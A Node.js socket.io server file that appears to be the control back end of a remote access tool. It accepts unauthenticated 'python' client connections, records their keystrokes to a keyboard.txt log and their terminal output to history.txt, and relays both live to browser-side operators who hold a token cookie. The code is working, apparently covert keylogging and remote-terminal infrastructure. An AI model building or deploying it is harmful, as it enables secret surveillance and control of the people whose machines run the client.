const path = require("node:path")
const fs = require("node:fs")
const cookieUtils = require("cookie")

const helpers = require('./helpers')
const config = require('../config')

const BROWSER_CLIENTS = {}
const PYTHON_CLIENTS = {}
const GLOBAL_CLIENTS = {}

// python ping to browser
function emitPingToBrowser(data) {
    Object.values(GLOBAL_CLIENTS || {}).forEach(socket => {
        socket.emit("client-ping", data)
    })

    Object.values(BROWSER_CLIENTS[data.id] || {}).forEach(socket => {
        socket.emit("client-ping", data)
    })
}

// python data to browser
function emitDataToBrowser(id, data) {
    Object.values(BROWSER_CLIENTS[id] || {}).forEach(socket => {
        socket.emit("receiver", data)
    })
}

global.IO.on("connection", socket => {
    const { id, clientType } = socket.handshake.auth

    // authentication for browser sockets
    if (clientType !== "python") {
        const rawCookies = socket.handshake.headers.cookie
        if (!rawCookies) {
            return socket.disconnect(true)
        }

        const { token } = cookieUtils.parse(rawCookies)
        if (!token || token !== config.token) {
            return socket.disconnect(true)
        }
    }

    console.log(`Connected [${clientType}] ${id}`)
    const clientPath = path.join(helpers.clientsFolderPath, id)
    const infoFile = path.join(clientPath, "info.json")

    if (clientType === "browser") {
        if (!BROWSER_CLIENTS[id]) {
            BROWSER_CLIENTS[id] = {}
        }

        BROWSER_CLIENTS[id][socket.id] = socket
    }

    else if (clientType === "python") {
        if (PYTHON_CLIENTS[id] && PYTHON_CLIENTS[id].connected) {
            console.log("Disconnecting old connection and connecting new one")
            // sending exit message to old connection
            PYTHON_CLIENTS[id].emit("receiver", {
                type: "others",
                action: "exit",
            })

            socket.__isNewConnection = true
        }

        if (!fs.existsSync(clientPath)) {
            fs.mkdirSync(clientPath)
        }

        PYTHON_CLIENTS[id] = socket
        const pingData = {
            id,
            isOnline: true,
            lastOnline: new Date().toLocaleString(),
        }

        emitPingToBrowser(pingData)
        helpers.writeJson(infoFile, pingData)

        socket.on("to-server", data => {
            // sending data to browser clients
            emitDataToBrowser(id, data)

            if (data.cwd) {
                return helpers.writeJson(infoFile, {
                    cwd: data.cwd
                })
            }

            if (data.type === "keyboard") {
                const keyboardFile = path.join(clientPath, "keyboard.txt")
                if (!fs.existsSync(keyboardFile)) {
                    fs.writeFileSync(keyboardFile, "")
                }

                return fs.appendFileSync(keyboardFile, `${data.output} `)
            }

            const historyFile = path.join(clientPath, "history.txt")
            if (!fs.existsSync(historyFile)) {
                fs.writeFileSync(historyFile, "")
            }

            fs.appendFileSync(historyFile, `\n[${data.type || "terminal"}]::[${new Date().toLocaleString()}]\n${data.output}\n`)
        })
    }

    else if (clientType === "global") {
        GLOBAL_CLIENTS[id] = socket
    }

    socket.on("disconnect", () => {
        console.log(`Disconnected [${clientType}] ${id}`)

        if (clientType === "browser") {
            const sockets = BROWSER_CLIENTS[id]
            delete sockets[socket.id]
            if (Object.keys(sockets).length === 0) {
                delete BROWSER_CLIENTS[id]
            }
        }

        else if (clientType === "python") {
            // if it is new connection, don't delete it
            if (PYTHON_CLIENTS[id].__isNewConnection) {
                PYTHON_CLIENTS[id].__isNewConnection = false
            } else {
                delete PYTHON_CLIENTS[id]
                const pingData = {
                    id,
                    isOnline: false,
                    lastOffline: new Date().toLocaleString(),
                }

                emitPingToBrowser(pingData)
                helpers.writeJson(infoFile, pingData)
            }
        }

        else if (clientType === "global") {
            delete GLOBAL_CLIENTS[id]
        }
    })
})

module.exports = {
    emitDataToBrowser,
    PYTHON_CLIENTS,
}